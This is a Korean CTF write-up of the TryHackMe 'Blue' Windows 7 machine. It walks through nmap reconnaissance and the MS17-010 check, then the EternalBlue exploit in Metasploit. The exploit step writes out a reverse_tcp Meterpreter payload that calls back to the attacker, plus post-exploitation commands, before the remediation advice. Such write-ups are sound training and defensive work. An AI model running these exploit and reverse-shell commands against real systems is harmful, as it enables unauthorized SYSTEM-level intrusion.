# THM Blue 라이트업 - EternalBlue / MS17-010

> SMBv1 / MS17-010 / EternalBlue / Meterpreter / SYSTEM 권한

---

## 1. 개요

THM Blue는 Windows 7 기반 머신에서 SMBv1 MS17-010 취약점을 확인하고, EternalBlue exploit을 통해 SYSTEM 권한을 획득하는 실습형 머신이다.

이 문서는 단순히 Metasploit 모듈을 실행했다는 기록이 아니라, 정찰 결과에서 왜 SMB 취약점을 의심했는지, `smb-vuln-ms17-010` 스크립트 결과를 어떻게 해석했는지, exploit 이후 권한과 증거를 어떻게 확인했는지에 초점을 맞춘다.

실제 flag 값과 민감한 세션 정보는 공개하지 않고, 포트폴리오용으로 재현 흐름과 판단 근거만 남겼다.

---

## 2. 대상 / 환경

| 항목 | 내용 |
| --- | --- |
| 머신 | TryHackMe Blue |
| OS | Windows 7 SP1 |
| 주요 포트 | 135, 139, 445, 49152-49157 |
| 핵심 취약점 | MS17-010 EternalBlue |
| 영향도 | 인증 없는 원격 코드 실행, SYSTEM 권한 획득 |

---

## 3. 공격 경로 요약

```text
Nmap 전체 포트 스캔
-> SMB 445 포트와 Windows 7 계열 서비스 확인
-> smb-vuln-ms17-010 NSE 스크립트로 취약 여부 검증
-> Metasploit EternalBlue 모듈 설정
-> reverse shell 또는 Meterpreter 세션 획득
-> SYSTEM 권한 확인
-> flag 위치와 파일 접근 가능성 확인
-> 패치, SMBv1 비활성화, 네트워크 차단 대응 정리
```

---

## 4. 정찰

### 4.1 전체 포트 스캔

```bash
nmap -sC -sV -p- --min-rate 5000 IP -oA blue_full
```

주요 결과는 SMB 포트였다.

| 포트 | 서비스 | 확인 포인트 |
| --- | --- | --- |
| 135 | MSRPC | Windows 계열 RPC |
| 139 | NetBIOS | SMB/NetBIOS |
| 445 | Microsoft-DS | Windows SMB |
| 49152-49157 | MSRPC | Windows 동적 RPC 포트 |

Windows 7 계열 SMB가 노출되어 있었기 때문에, 우선 오래된 SMBv1 취약점 여부를 확인했다.

---

## 5. MS17-010 취약 여부 확인

```bash
nmap --script smb-vuln-ms17-010 -p 445 IP
```

결과에서 `VULNERABLE`이 확인되면 MS17-010 공격 가능성이 매우 높다.

![MS17-010 취약 여부 확인](assets/reports/htb-blue/01-ms17-010-vulnerable.png)

이 단계에서 중요한 것은 “445 포트가 열려 있다”가 아니라, NSE 스크립트가 SMBv1 MS17-010 취약 상태를 명확히 표시했다는 점이다. 보고서에는 열린 포트 목록만 쓰기보다, 어떤 근거로 공격 모듈을 선택했는지를 남기는 것이 더 설득력 있다.

---

## 6. 취약점 원리

MS17-010은 SMBv1 요청 처리 과정의 메모리 처리 결함을 악용하는 취약점이다. 공격자가 조작된 SMB 패킷을 전송하면 커널 권한 코드 실행으로 이어질 수 있다.

```text
조작된 SMBv1 요청
-> SMB 서버 처리 루틴의 메모리 오류 유발
-> 커널 권한 코드 실행
-> NT AUTHORITY\SYSTEM 권한 획득
```

이 취약점은 WannaCry, NotPetya 같은 대규모 사고와 연결되어 있기 때문에, 실제 환경에서는 단순 CTF 취약점이 아니라 즉시 조치해야 하는 Critical 위험으로 봐야 한다.

---

## 7. Exploit 수행

Metasploit 모듈을 사용해 exploit을 수행했다.

```bash
msfconsole

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS IP
set LHOST VPN_IP
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
```

실습 중에는 exploit 이후 shell을 Meterpreter로 전환하거나, 세션 안정성을 위해 프로세스 migrate를 수행할 수 있다.

```text
search shell_to_meterpreter
migrate PID
```

여기서 migrate는 단순 편의 기능이 아니라, 불안정한 exploit 프로세스에서 비교적 안정적인 시스템 프로세스로 이동해 세션이 끊기는 위험을 줄이기 위한 절차다.

---

## 8. 권한 확인

세션 획득 후 가장 먼저 권한을 확인했다.

```cmd
whoami
```

예상 결과:

```text
nt authority\system
```

![SYSTEM 권한 Meterpreter 세션](assets/reports/htb-blue/02-system-meterpreter-session.png)

Blue는 취약점 하나로 바로 SYSTEM까지 이어지는 머신이지만, 보고서에서는 exploit 성공만 적지 않고 “어떤 권한을 얻었고, 그 권한으로 무엇이 가능한지”를 분리해서 적는 것이 중요하다.

---

## 9. 파일 접근과 증거 확인

권한 획득 후 사용자/관리자 디렉터리 접근 가능성을 확인했다.

```cmd
dir C:\Users
dir /s /b C:\*flag*.txt
```

Meterpreter에서는 파일 검색도 가능하다.

```text
search -f flag3.txt
```

![파일 위치 검색](assets/reports/htb-blue/03-flag-search-path.png)

공개 포트폴리오에는 flag 값을 직접 올리지 않고, 권한 획득과 파일 접근 가능성만 증거로 남겼다.

---

## 10. 영향도

| 구분 | 내용 |
| --- | --- |
| 인증 필요 여부 | 인증 없이 공격 가능 |
| 획득 권한 | SYSTEM |
| 공격 범위 | SMBv1이 노출된 미패치 Windows 시스템 |
| 위험도 | Critical |

SMB가 내부망에만 열려 있더라도 위험도는 낮지 않다. 내부 침해 이후 lateral movement 단계에서 오래된 SMB 취약점은 빠르게 도메인 확산으로 이어질 수 있다.

---

## 11. 대응 방안

- MS17-010 보안 업데이트 적용
- SMBv1 비활성화
- 외부 및 불필요한 내부망에서 445/139 포트 차단
- Windows 7/Server 2008 계열 시스템 교체 또는 격리
- 취약점 스캐너와 자산 관리로 미패치 시스템 주기 점검
- IDS/IPS에서 EternalBlue 시그니처 탐지 룰 적용

---

## 12. 학습한 점

- 오래된 Windows 취약점은 exploit이 쉬워 보여도 정찰 근거와 패치 상태 확인이 중요하다.
- Nmap NSE 결과는 공격 모듈 선택의 근거가 될 수 있다.
- exploit 성공 후에는 권한, 세션 안정성, 파일 접근 가능성을 차례대로 검증해야 한다.
- 보고서에서는 flag보다 취약 원리, 영향도, 대응 방안을 남겨야 실무형 문서에 가까워진다.
